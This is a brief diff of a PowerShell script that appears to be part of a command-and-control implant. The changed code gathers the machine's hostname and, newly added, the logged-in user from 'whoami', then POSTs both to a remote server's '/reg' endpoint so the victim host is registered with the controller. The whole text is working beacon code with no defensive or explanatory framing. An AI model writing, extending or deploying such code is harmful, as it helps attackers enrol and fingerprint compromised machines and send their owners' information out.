@@ -4,9 +4,11 @@ $sleep_time = 3
 $name = ""
 
 $hname = [System.Net.Dns]::GetHostName()
+$uname = whoami
 $regl  = ("http" + ':' + "//$ip" + ':' + "$port/reg")
 $data  = @{
-    name = "$hname" 
+    hname = "$hname"
+    uname = "$uname"
 }
 $name  = (Invoke-WebRequest -UseBasicParsing -Uri $regl -Body $data -Method 'POST').Content
 
